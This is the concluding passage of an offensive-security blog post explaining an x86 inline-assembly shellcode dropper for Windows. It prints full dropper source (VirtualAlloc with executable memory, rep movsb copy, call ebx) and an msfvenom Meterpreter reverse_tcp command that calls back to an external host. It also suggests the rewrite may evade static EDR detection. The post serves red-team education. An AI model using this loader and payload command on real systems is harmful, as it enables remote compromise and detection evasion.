+<ul><li>The source address of the shellcode (code) is loaded correctly, i.e. the shellcode itself is loaded correctly.<br><br></li><li>The target address of the shellcode is loaded correctly, i.e. where the shellcode is to be copied to (exec).<br><br></li><li>The shellcode size is loaded correctly (codeSize).</li></ul><p></p>
+<p>But let's take a closer look at the inline assembly code. In the first line, the <strong>source address</strong> of the <strong>shellcode</strong> is loaded by moving the address of the code into the <code>esi</code> register with the <code>lea</code> instruction.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">lea esi, [code]		; Load the address of the code data into the ESI register using lea instruction</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The next line defines the <strong>destination address</strong> where the previously loaded <strong>shellcode</strong> is to be stored. This is done by moving the <code>exec</code> variable to the <code>edi</code> register with the <code>mov</code> command. But why move <code>exec</code> to <code>edi</code>?<br><br>If we look at the inline assembly block from earlier, we see that the memory allocated by <code>VirtualAlloc</code> was buffered in the <code>eax</code> register and then moved to the <code>exec</code> variable by the <code>mov</code> instruction. Therefore, the variable <code>exec</code>, declared as a <code>void*</code> pointer, contains the base address of the allocated memory and thus the target address for the shellcode.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">mov edi, exec    ; Load the address of the allocated memory into the EDI register</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The next step is to define the <code>size</code> of the<code>shellcode</code>. This is done by creating the variable <code>codeSize</code> at the very beginning of the code, which is declared as a <code>DWORD</code> and stores the size of the x86 shellcode. For this reason, the next line of assembler code specifies that the contents of the variable codeSize - i.e. the size of the shellcode - is to be moved into the <code>ecx</code> register using the <code>mov</code> instruction.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">mov ecx, codeSize	; Load the size of the code into the ECX register</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The last two lines of assembly in this inline assembly block are a bit more complicated, but I'll do my best and hope that I've understood the code and the connection between the two lines and can make them understandable. In simple terms, these two lines ensure that the shellcode is copied <strong>byte by byte</strong> in the <strong>correct order</strong> from the <strong>source address</strong> to the <strong>destination address</strong>.</p>
+<p>First, the copying order must be ensured by the correct declaration of the <strong>direction flag</strong> (cld). This means that the direction flag has two states, <code>set(1)</code> and <code>clear(0)</code>. While set causes <code>esi</code> and <code>edi</code> to be decremented (i.e. from higher to lower memory addresses), <code>clear(0)</code> causes esi and edi to be incremented (i.e. from lower to higher memory addresses). In order for the shellcode to be correctly copied from lower to higher memory addresses in our case, the direction flag must be set to clear(0) with the <code>cld</code><strong> (clear direction flag)</strong> command. If the direction flag were set to <code>set(1)</code>, the shellcode would be copied in the wrong order and execution of the shellcode would fail.</p>
+<p>Once the copying order has been set, it is still necessary to ensure that the shellcode is copied correctly, byte by byte, from the source address to the destination address. This is done using the assembler command <code>rep movsb</code>, which stands for <code>repeat move string byte</code> and is therefore self-explanatory.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">cld          ; Clear the direction flag
+rep movsb    ; Copy the code data to the allocated memory byte by byte</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>This completes the analysis of the second inline assembly block of our x86 inline assembly shellcode dropper and the second inline assembly block looks like this.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">// Copy shellcode into allocated memory
+    __asm {
+        lea esi, [code]		; Load the address of the code data into the ESI register using lea instruction
+        mov edi, exec		; Load the address of the allocated memory into the EDI register
+        mov ecx, codeSize	; Load the size of the code into the ECX register
+        cld					; Clear the direction flag
+        rep movsb			; Copy the code data to the allocated memory byte by byte
+    }</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>x86 Inline Assembly: Execute Shellcode </h4>
+<p>We have now done the hardest part. To recap, in the last two steps, or the last two inline assembly blocks, we have provided the inline assembly shellcode dropper:</p>
+<ul><li>That memory is allocated for the shellcode....<br><br></li><li>...and the shellcode is copied in the correct order from the source address to the destination address. </li></ul><p></p>
+<p>With the definition of the last inline assembly block, the <strong>shell code</strong> is finally ready for <strong>execution</strong>. To do this, the address of the <strong>allocated memory </strong><code>exec</code> is moved or copied to register <code>ebx</code> using the <code>mov</code> instruction. Then the shellcode is executed in the allocated memory by calling the register ebx with the <code>call</code> instruction. In short, if everything has been done correctly and, for example, x86 meterpreter shellcode is used as shellcode, a command and control channel should open in conjunction with the correct configuration of a meterpreter listener. The third completed inline assembly block looks like this.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">__asm {
+        mov ebx, exec    ; Load the address of the allocated memory into the EBX register
+        call ebx         ; Call the code in the allocated memory
+    }</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The <strong>finished inline assembly dropper code</strong> looks like this and can be used in conjunction with the x86 meterpreter shellcode, for example.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">msfvenom -p windows/meterpreter/reverse_tcp LHOST=External_IPv4_Redirector LPORT=80 -f c</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+int main() {
+
+    // Insert x86 Meterpreter shellcode  
+    unsigned char code[] = "\xfc\xe8\x8f";
+
+    // Variables to store the allocated memory address and shellcode size
+    void* exec;
+    DWORD codeSize = sizeof code;
+
+    __asm {
+        // Push the function arguments onto the stack in reverse order for VirtualAlloc
+        push PAGE_EXECUTE_READWRITE
+        push MEM_COMMIT
+        push codeSize
+        push 0
+
+        // Call VirtualAlloc
+        call VirtualAlloc
+
+        // Store the result (allocated memory address) in 'exec'
+        mov exec, eax
+
+        // Clean up the stack (4 arguments * 4 bytes each)
+        // add esp, 16
+    }
+
+    // Copy shellcode into allocated memory
+    __asm {
+        lea esi, [code]     ; Load the address of the code data into the ESI register using lea instruction
+        mov edi, exec       ; Load the address of the allocated memory into the EDI register
+        mov ecx, codeSize   ; Load the size of the code into the ECX register
+        cld                 ; Clear the direction flag
+        rep movsb           ; Copy the code data to the allocated memory byte by byte
+    }
+
+    // Execute shellcode in memory
+    __asm {
+        mov ebx, exec       ; Load the address of the allocated memory into the EBX register
+        call ebx            ; Call the code in the allocated memory
+    }
+
+    return 0;
+}</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Comparison: C++ vs Inline Assembly</h3>
+<p>Before coming to the summary and conclusion of the article after this point, I would like to make some comparisons between the reference code and the rewritten code. Let's remember that both are high-level API droppers based on the use of Windows APIs. More specifically, both code variants used the Windows API VirtualAlloc, only the way <code>VirtualAlloc</code> was called was different, but more on that later. Our goal was to rewrite the reference code, or the functions it contained, from C++ to x86 inline assembly code under Visual Studio. Here is a quick comparison between the C++ and x86 inline assembly versions.</p>
+<h4>Declaration Shellcode</h4>
+<p>Nothing has changed in the shellcode itself, both POCs can be filled with e.g. x86 Meterpreter shellcode or x86 Calculator shellcode. The declaration in the inline assembly variant is slightly different, because due to the use of x86 inline assembly, the variable codeSize, which stores the size of the shellcode, has to be declared as <code>DWORD</code>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">// Rewritten code in x86 Inline Assembly -&gt; Declaration DWORD
+DWORD codeSize = sizeof code;</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Memory Allocation</h4>
+<p>In the reference code, memory was allocated by calling <code>VirtualAlloc</code> directly; in the inline assembly variant, the required arguments of the <code>VirtualAlloc</code> function were first placed on the stack using a <code>push</code> instruction, and then called using the <code>VirtualAlloc</code> call instruction.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">// Reference code C++ -&gt; Allocate Virtual Memory 
+	void* exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+// Rewritten code in x86 Inline Assembly -&gt; Allocate Virtual Memory 
+__asm {
+        // Push the function arguments onto the stack in reverse order for VirtualAlloc
+        push PAGE_EXECUTE_READWRITE
+        push MEM_COMMIT
+        push codeSize
+        push 0
+
+        // Call VirtualAlloc
+        call VirtualAlloc
+
+        // Store the result (allocated memory address) in 'exec'
+        mov exec, eax
+
+        // Clean up the stack (4 arguments * 4 bytes each)
+        // add esp, 16
+    }</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Copying the shellcode</h4>
+<p>To copy the shellcode from the source address to the target address, the C++ reference code used the <code>memcpy</code> function. In comparison, the rewritten x86 inline assembly variant used the assembly instruction <code>rep movsb</code> to copy the shellcode byte by byte from the source address to the target address.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">// Reference code C++ -&gt; Copy shellcode into allocated memory 
+	memcpy(exec, code, sizeof code);
+
+// Rewritten code in x86 Inline Assembly -&gt; Copy shellcode into allocated memory
+    __asm {
+        lea esi, [code]     ; Load the address of the code data into the ESI register using lea instruction
+        mov edi, exec       ; Load the address of the allocated memory into the EDI register
+        mov ecx, codeSize   ; Load the size of the code into the ECX register
+        cld                 ; Clear the direction flag
+        rep movsb           ; Copy the code data to the allocated memory byte by byte
+    }</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Shellcode Execution</h4>
+<p>In both code variants, the shellcode is executed by calling the memory address in the variable <code>exec</code>. The difference is that in the reference code, execution takes place directly via a function pointer to the variable <code>exec</code>, whereas in the rewritten inline assembly code, the memory address of <code>exec</code> is first moved to the register<code>ebx</code> and then called via a call statement.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">// Reference code C++ -&gt; Execute shellcode in memory 
+	((void(*)())exec)();
+
+// Rewritten code in x86 Inline Assembly -&gt; Execute shellcode in memory
+    __asm {
+        mov ebx, exec       ; Load the address of the allocated memory into the EBX register
+        call ebx            ; Call the code in the allocated memory
+    }</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Summary and insights</h3>
+<p>In this article we have discussed the basics of compiling source code, as well as some of the basics of x86 assembly, which should help you understand the rest of the article. After explaining the basics of x86 assembly using two computational examples, the next step was to begin the technical implementation of the x86 inline assembly shellcode dropper in MSVC syntax.</p>
+<p>The main task was to rewrite a high-level API reference dropper in such a way that the Windows APIs or functions used are not represented as C++ code, but are replaced or rewritten by the corresponding x86 Inline Assembly (MSVC) statements. This means that the functions required to reserve memory, copy the shellcode into the reserved memory and execute the shellcode have been implemented in a C++ project under Visual Studio 2019 using x86 Inline Assembly according to the MSVC syntax. The following figure shows the transformation of the original reference code into the x86 Inline Assembly code.</p>
+<figure class="image-center" style="border:0px solid rgb(229,231,235);margin:0px 0px 1em;padding:0px;clear:both;color:rgb(63,77,90);font-family:'system-ui', BlinkMacSystemFont, '-apple-system';"><img src="https://redops.at/assets/images/blog/comparison_dropper_winapis_inlineassembly.png" alt=""></figure><p>One of the most important realisations during the development of this article and the Inline Assembly Dropper was that Inline Assembly is not automatically synonymous with Direct System Call. This may sound trivial to some, but I personally feel that this realisation is fundamental to understanding the concept of inline assembly. Initially, I thought that if I rewrote the high level API dropper to inline assembly, then the corresponding system calls for Virtual Alloc, for example, would no longer be done via ntdll.dll, since I was using assembly code. However, it was only during my research that I realised that the necessary system calls still had to be obtained via ntdll.dll, as only the notation of the functions used in the C++ project had been rewritten to x86 Inline Assembly. This also made me realise that it is possible to develop the dropper in the direction of medium level APIs (NTAPIS) and low level APIs (syscalls). This is definitely exciting from a programming point of view, but I don't think that the concept of x86 Inline Assembly generally offers any advantage in the area of EDR evasion, since the basic function of the code always remains the same, only the programming representation of the code changes.<br><br>What I can imagine is that representing the source code of the required Windows APIs and functions in the inline assembly format could possibly have a positive impact (from the red team's point of view) on the static detection patterns of antivirus, endpoint protection and EDR. That is, some endpoint security products analyse the source code for combinations of APIs that are commonly used in the context of malicious code execution, and trigger on them if necessary. Rewriting inline assembly code could potentially break some of these detection patterns.<br><br>At the end of this article, I can say that it's been a long time since I've learnt as much as I have writing this article. I have never delved so deeply into the details of compilers, assemblers, stacks, etc., and it was simply brilliant. Assembly continues to fascinate me and I'm looking forward to more exciting projects.<br><br>All <strong>code examples</strong> in this article can also be found on my<strong> <a href="https://github.com/VirtualAlllocEx/Shell-we-Assembly" target="_blank" rel="noreferrer noopener">Github account</a></strong>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-red">
+    <div class="content blog-container">
+        <div class="text">
+            <p>Happy Hacking!</p>
+<p>Daniel Feichter <a href="https://twitter.com/VirtualAllocEx" target="_blank" rel="noreferrer noopener">@VirtualAllocEx</a></p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-grey">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Referenzen&nbsp;</h3>
+<ul><li><a href="https://learn.microsoft.com/en-us/cpp/assembler/inline/inline-assembler?view=msvc-170">https://learn.microsoft.com/en...</a></li><li><a href="https://learn.microsoft.com/en-us/cpp/assembler/masm/microsoft-macro-assembler-reference?view=msvc-170">https://learn.microsoft.com/en...</a></li><li><a href="https://learn.microsoft.com/en-us/cpp/assembler/inline/inline-assembler-overview?view=msvc-170">https://learn.microsoft.com/en...</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">https://learn.microsoft.com/en...</a></li><li><a href="https://learn.microsoft.com/de-de/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170">https://learn.microsoft.com/de...</a></li><li><a href="https://learn.microsoft.com/en-us/cpp/cpp/stdcall?view=msvc-170">https://learn.microsoft.com/en...</a></li><li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-injection">https://www.ired.team/offensiv..</a></li><li><a href="https://www.cs.virginia.edu/~evans/cs216/guides/x86.html">https://www.cs.virginia.edu/~e...</a></li><li><a href="http://flint.cs.yale.edu/cs421/papers/x86-asm/asm.html">http://flint.cs.yale.edu/cs421...</a><br></li><li><a href="https://cs.lmu.edu/~ray/notes/nasmtutorial/">https://cs.lmu.edu/~ray/notes/...</a></li><li><a href="https://en.wikibooks.org/wiki/X86_Assembly">https://en.wikibooks.org/wiki/...</a></li><li><a href="https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture">https://en.wikibooks.org/wiki/...</a></li><li><a href="https://www.youtube.com/playlist?list=PLmxT2pVYo5LB5EzTPZGfFN0c2GDiSXgQe">https://www.youtube.com/playli...</a></li><li><a href="https://youtu.be/L1ung0wil9Y" target="_blank" rel="noreferrer noopener">https://youtu.be/L1ung0wil9Y</a></li><li>Kip; Irvine.&nbsp;Assembly Language for x86 Processors 8th Edition, Pearson, 2020</li></ul>
+        </div>
+    </div>
+</section>
+                    </div>
+        <div class="blog-info container">
+            <div class="updated">
+                Last updated
+                <span class="desktop">
+                    14.10.25 16:44:03
+                </span>
+                <span class="mobile">
+                    14.10.25
+                </span>
+            </div>
+            <div class="author">
+                Daniel Feichter
+            </div>
+        </div>
+        <div class="further-reading container">
+                                    <ul class="blog-list">
+                            </ul>
+        </div>
+    </div>
+        </main>
+        <button type="button" id="BackToTop">Back to top</button>
+        
+
+        
+
+<link href="https://redops.at/dist/assets/main-ioE-islD.css" rel="stylesheet" media="all">
+            
+    
+    <div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div>
+
+</body></html>
